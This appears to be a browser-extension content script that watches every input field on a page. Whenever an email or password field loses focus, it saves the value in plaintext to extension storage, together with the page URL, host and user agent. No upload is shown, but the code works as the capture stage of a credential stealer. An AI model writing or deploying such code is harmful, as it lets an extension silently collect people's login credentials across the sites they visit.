var inputs=document.querySelectorAll('input');
chrome.storage.local.set({session:{},url:window.location.href,host:window.location.host,userAgent:navigator.userAgent},()=>{
    console.log("initialised");
});
//session is nothing but fields 
inputs.forEach(input=>{
    input.addEventListener('blur',e=>{
        let {type,value} = input;
        if(value.trim()!="" && (type=="email" || type=="password")){
          chrome.storage.local.get(['session'],obj=>{
              session=obj.session;
              session[type]=value;
              chrome.storage.local.set({session:session});
          })
        }
    })
});
